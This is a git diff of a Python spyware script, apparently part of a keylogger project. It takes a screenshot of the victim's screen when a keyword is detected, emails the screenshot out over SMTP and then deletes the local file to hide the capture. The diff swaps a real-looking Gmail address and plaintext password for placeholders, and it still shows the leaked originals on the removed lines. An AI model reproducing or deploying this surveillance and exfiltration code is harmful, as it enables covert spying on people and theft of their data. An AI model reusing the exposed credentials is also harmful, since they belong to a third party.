@@ -18,20 +18,20 @@ name = socket.gethostname()
 time = time.strftime("%H-%M-%S")
 a = name + time
 myScreenshot = pyautogui.screenshot()
-myScreenshot.save(r'C:\Users\fourbrick\Desktop\proj\AKL\emails\SS-'+a+'.png')
+myScreenshot.save(r'PATH_TO_DIRECTORY\emails\SS-'+a+'.png')
 
 # the email part
-sender_email = 'dhinpooja69@gmail.com'
-reciever_email = 'dhinpooja69@gmail.com'
-password = 'ThinkPad#1234567890'
-subject = 'Python!'
+sender_email = 'SENDER_EMAIL'
+reciever_email = 'RECIEVER_EMAIL'
+password = 'EMAIL_PASSWORD'
+subject = 'This email conatins Screenshot from Victims user because specific keyword was detected!'
 
 msg = MIMEMultipart()
 msg['From'] = sender_email
 msg['To'] = reciever_email
 msg['Subject'] = subject
 
-email_body = 'This is a test email sent by python. Isnt that cool?'
+email_body = 'The specific keyword was detected so here is the Screenshot!'
 msg.attach(MIMEText(email_body, 'plain'))
 
 filename = 'SS-'+a+'.png'         #storing the file to be sent
@@ -64,4 +64,4 @@ finally:
 attachment.close()
 
 # removing the Screenshot from User's System
-os.remove(r'C:\Users\fourbrick\Desktop\proj\AKL\emails\SS-'+a+'.png')
+os.remove(r'PATH_TO_DIRECTORY\emails\SS-'+a+'.png')
